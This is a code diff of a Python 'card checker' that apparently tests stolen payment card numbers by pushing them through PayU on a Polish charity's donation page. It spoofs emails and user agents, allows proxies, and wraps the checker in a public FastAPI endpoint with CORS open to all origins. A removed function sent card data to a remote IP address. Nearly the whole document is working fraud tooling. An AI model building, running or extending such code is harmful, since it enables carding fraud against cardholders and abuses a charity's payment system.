@@ -1,17 +1,27 @@
+from fastapi import FastAPI, Query, HTTPException
+from fastapi.middleware.cors import CORSMiddleware
 import re
 import json
 import time
 import random
 import string
-import asyncio
 import requests
 
+app = FastAPI()
+
+# Allow semua domain akses API ni (sesuai untuk check di website)
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
 
 def _random_email():
     chars = string.ascii_lowercase + string.digits
     user = ''.join(random.choices(chars, k=10))
     return f"{user}@gmail.com"
-
 
 def _random_ua():
     versions = [
@@ -22,7 +32,6 @@ def _random_ua():
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
     ]
     return random.choice(versions)
-
 
 def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     headers = {
@@ -62,7 +71,6 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
 
     return data
 
-
 def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
     """Synchronous PayU charge check via fundacjakukuczki.pl donation page"""
     session = requests.Session()
@@ -80,7 +88,6 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # ─── Step 1: Create donation order ───
         headers1 = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -132,7 +139,6 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if not order_id or not token:
             return 'Failed to extract orderId or token'
 
-        # ─── Step 2: Load PayU pay page ───
         params2 = {
             'orderId': order_id,
             'token': token,
@@ -157,7 +163,6 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
         session.get('https://secure.payu.com/pay/', params=params2, headers=headers2)
 
-        # ─── Step 3: Tokenize card ───
         headers3 = {
             'accept': '*/*',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
@@ -199,13 +204,11 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         card_token = token_data.get('value')
 
         if not card_token:
-            # Return the raw error from PayU tokenization
             error_msg = token_data.get('error', {}).get('message', '') if isinstance(token_data.get('error'), dict) else str(token_data.get('error', ''))
             if error_msg:
                 return f'Tokenization failed: {error_msg}'
             return f'Failed to tokenize card'
 
-        # ─── Step 4: Submit payment ───
         masked = cc[:6] + '*' * 6 + cc[-4:]
 
         json4 = {
@@ -257,7 +260,6 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if error_code:
             return f'Payment error: {error_code}'
 
-        # ─── Step 5: Poll for result ───
         if continue_url and 'threeds' in continue_url:
             final_status = _poll_status(session, order_id, token, ua, max_attempts=10, delay=3)
         else:
@@ -282,39 +284,16 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
     finally:
         session.close()
 
-
-async def payu_charge_check(card_str, proxy_str=None):
-    """Check a single card via PayU Charge API"""
-    try:
-        parts = card_str.split('|')
-        if len(parts) != 4:
-            return 'Invalid card format'
-        cc, mm, yy, cvv_code = parts
-        mm = mm.zfill(2)
-        if len(yy) == 2:
-            yy = '20' + yy
-        formatted_card = f"{cc}|{mm}|{yy}|{cvv_code}"
-
-        import aiohttp
-        import urllib.parse
-        import json
-
-        url = f"http://16.176.4.84:3002/payu?cc={urllib.parse.quote(formatted_card)}"
-        async with aiohttp.ClientSession() as session:
-            async with session.get(url, timeout=30) as resp:
-                if resp.status != 200:
-                    return f"API HTTP Error: Status {resp.status}"
-                text = await resp.text()
-                if not text or not text.strip():
-                    return "Empty response from API"
-                try:
-                    data = json.loads(text)
-                    if isinstance(data, dict):
-                        msg = data.get('message') or data.get('Response') or data.get('msg')
-                        if msg:
-                            return str(msg).strip()
-                except Exception:
-                    pass
-                return text.strip()
-    except Exception as e:
-        return f'API Error: {str(e)}'
+@app.get("/check")
+def check_card(cc: str = Query(...)):
+    parts = cc.split('|')
+    if len(parts) != 4:
+        raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
+    
+    card_num, mm, yy, cvv_code = parts
+    mm = mm.zfill(2)
+    if len(yy) == 2:
+        yy = '20' + yy
+        
+    result = _payu_sync(card_num, mm, yy, cvv_code)
+    return {"message": result}
